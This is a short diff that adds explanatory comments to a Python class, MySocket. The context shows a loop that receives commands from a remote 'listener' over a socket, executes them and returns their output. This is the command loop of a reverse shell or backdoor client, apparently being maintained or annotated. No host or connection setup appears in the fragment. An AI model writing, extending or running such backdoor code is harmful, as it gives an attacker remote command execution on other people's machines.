@@ -21,6 +21,7 @@ class MySocket:
             return error.output or str(error)
 
     def send_json(self, data):
+        # Send strings in a predictable wire format that matches the listener.
         json_data = json.dumps(data)
         self.my_connection.send(json_data.encode())
 
@@ -33,6 +34,7 @@ class MySocket:
             command = self.json_receive()
             if command.lower() == "exit":
                 break
+            # Run the requested command and return either its output or error text.
             command_output = self.command_execute(command)
             self.send_json(command_output)
         self.my_connection.close()
